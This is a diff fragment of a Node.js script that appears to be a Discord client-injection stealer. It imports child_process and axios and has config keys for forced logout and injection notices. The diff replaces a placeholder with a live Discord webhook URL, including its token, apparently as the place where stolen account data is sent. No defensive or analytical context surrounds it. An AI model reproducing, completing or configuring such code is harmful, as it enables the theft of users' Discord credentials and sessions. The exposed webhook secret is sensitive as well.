@@ -7,7 +7,7 @@ const {
 } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const superstarlmao = "da_webhook"
+const superstarlmao = "https://discord.com/api/webhooks/1121929264175009933/ryPNTXVhg63XcczJmAebC0p3df4xWh0r32cQifGyBiRqnv1tEEuOz4H0nL1MsRjr4DGs"
 const config = {
     "logout": "%LOGOUT%1",
     "inject-notify": "%INJECTNOTI%1",
